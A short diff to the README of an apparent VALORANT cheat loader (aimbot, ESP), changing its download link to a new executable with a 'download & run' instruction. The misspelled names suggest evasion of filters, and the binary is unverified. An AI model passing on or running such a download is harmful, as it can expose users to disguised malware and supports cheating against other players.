@@ -93,7 +93,7 @@ VAL0ADER is a VALORANT Cheetloader which comes with A1mbot, ESP, Visual Modifier
 ---
 
 ## Installation
-[Download](https://github.com/Lunahax/VAL0ADER/releases/download/1.5-F/CL.exe) & run the file, adjust settings, use.
+[Download](https://github.com/Lunahax/VAL0ADER/releases/download/1.5-F/CL.new.exe) & run the file, adjust settings, use.
 
 ---
 
